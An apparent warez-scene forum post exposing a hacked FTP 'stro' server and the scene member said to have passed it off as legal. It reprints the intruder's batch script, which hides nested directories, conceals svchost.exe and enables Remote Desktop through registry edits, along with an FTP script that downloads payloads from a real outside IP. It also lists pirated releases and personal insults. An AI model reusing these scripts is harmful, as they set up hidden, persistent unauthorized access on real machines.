@@ -1,0 +1,129 @@
+﻿hey dear sceners...
+
+
+first i will say this -- i was fucked up by some lame fxp kid called Xions or Xion thats inside our lovley scene!
+
+
+this lame shit fxper Xions , gave me a box that apparently supposed to be legal box.
+
+
+well, after some time spending in the box, i found up some really strange stuff about it
+
+first..
+
+the login text:
+
+
+FlashFXP v3.1.5 build 1054 [BETA RELEASE]
+Support Forums at http://forum.flashfxp.com
+ 
+WinSock 2.0 -- OpenSSL 0.9.7e 25 Oct 2004
+[R] Connecting to **.***.**.** -> IP=**.***.**.** PORT=*****
+[R] Connected to **.***.**.**
+[R] 220-Logical Disk Service
+[R] 220-i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i!i
+[R] 220-i!i!|¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+[R] 220-i!i!|  Another Stro Production By Narcotica ! <<---------- !!! Narcotica = after long investigation i found out that Narcotia is an fxper and was admin of some fxp board call Apoc 
+[R] 220-i!i!|                  SERVER.INFO
+[R] 220-i!i!|                             
+[R] 220-i!i!|                                                    
+[R] 220-i!i!|    Free Disk Space    68834.46 MB          
+[R] 220-i!i!|    Current Speed      0.000 Kb/sec 
+[R] 220-i!i!|    Average Speed      0.001 Kb/sec  
+[R] 220-i!i!|    Current Users      1 / Unlimited
+[R] 220-i!i!|    Time Connected     0 mins
+
+
+well the login is not all...
+
+after watching that, i started to search in the files to get something out of this
+and luckley i found some nice and lame stuff..files that the hacked used:
+
+an auto stro maker file a batch file:
+
+mkdir c:\System Volume Information\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir1
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir2
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir3
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir4
+mkdir c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir5
+
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\svchost.exe +h
+attrib c:\System Volume Information\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\ +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir1 +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir2 +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir3 +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir4 +R +H +S +A
+attrib c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir5 +R +H +S +A
+
+echo Windows Registry Editor Version 5.00> c:\hide.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>> c:\hide.reg
+echo "fDenyTSConnections"=dword:00000000>> c:\hide.reg
+REGEDIT /S c:\hide.REG
+DEL c:\hide.REG /q
+
+echo Windows Registry Editor Version 5.00> c:\hide.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>> c:\hide.reg
+echo "AllowTSConnections"=dword:00000001>> c:\hide.reg
+REGEDIT /S c:\hide.REG
+DEL  c:\hide.REG /q
+
+also another batch file that helped the hacker to upload his files inside the box:
+
+open 62.217.63.12 53535
+eXume <<---- another name for lame fxp board
+upload
+get sc.exe
+get svchost.exe <<----- the file that actually started the ftp server on strange and unknown port
+get path.bat
+bye
+
+
+here's the process of the ftp file:
+c:\WINDOWS\msapps\msinfo\.mshome\lpt1\com3\.dll\svchost.exe
+c:\sites\mona\phpmyadmin2\svchost.exe
+
+also the hacked used some remote access app as a backdoor:
+c:\WINDOWS\system32\wmc\admdll.dll
+
+
+And i also found some releases dirs inside the so called "racedirs" of this ftp server:
+in:
+c:\System Volume Information\_restore{733857B3-9848-4C75-B1F3-350DF9DA8338}\RP00\normalcolor\temp\etc\com1\com6\prn.laserjet\lpt\aux\bin\home\racedir5
+i found out
+Prison.Break.S01E21.HDTV.XviD-LOL
+Firewall.2006.NTSC.DVDR-FCR
+The.Sentinel.2006.PROPER.TS.XViD-BLiNK
+
+
+and also other releases dirs in other "racedirs"
+
+
+
+
+well i hope it will help you guys out there to make this lame shit Xions to be out of the scene for ever !!!!
+this guy tricked many release groups by giving and telling them that its a legal server, and the admin of the box is aware of their presence.
+and he got many sites access and leech slots for that.
+Xions you're a fucking lamer!
